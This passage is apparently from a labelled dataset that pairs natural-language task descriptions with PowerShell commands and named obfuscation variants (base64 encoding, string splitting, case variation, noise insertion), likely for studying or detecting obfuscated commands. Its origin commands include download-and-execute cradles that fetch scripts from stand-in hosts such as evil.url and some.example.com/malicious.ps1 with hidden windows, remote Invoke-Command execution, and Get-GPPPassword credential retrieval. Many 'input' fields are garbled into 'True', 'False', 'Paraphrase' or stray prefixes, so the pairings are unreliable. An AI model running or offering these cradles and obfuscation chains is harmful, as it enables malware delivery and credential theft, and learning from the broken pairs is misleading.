    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Source and execute a script stored in a Group Policy Preferences (GPP) script path, then retrieve passwords using Get-GPPPassword.",
    "origin_cmd": ". ${gpp_script_path} ; Get-GPPPassword -Verbose"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "powershell.exe -e [base64 encode d command]",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Execute a PowerShell command encoded in base64.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell command encoded in base64.",
    "origin_cmd": "powershell.exe -e [base64 encode d command]"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Unexpectedly : Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Paraphrase",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Unexpectedly : Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Paraphrase",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Unexpectedly : Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Paraphrase",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Unexpectedly : Invoke a command on a remote system to download and execute a script from a specified URL.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Paraphrase",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Invoke a command on a remote system to download and execute a script from a specified URL.",
    "origin_cmd": "Invoke-Command -ComputerName <RemoteComputerName> -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://ForzaNapoli.com')}"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "sleep 100",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Pause execution for 100 seconds.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Pause execution for 100 seconds.",
    "origin_cmd": "sleep 100"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window. This is what I did below.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window. This is what I did below.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window. This is what I did below.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window. This is what I did below.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window.",
    "origin_cmd": "powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://some.example.com/malicious.ps1');\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "True",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "True",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "True",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "False",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "True",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start a new CMD process that executes a PowerShell command to download and execute a script from a remote URL.",
    "origin_cmd": "$Process = Start-Process -FilePath \"C:\\Windows\\System32\\cmd.exe\" -ArgumentList \"/c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.url/evil.ps1')\""
  },
  {
    "input": "False",
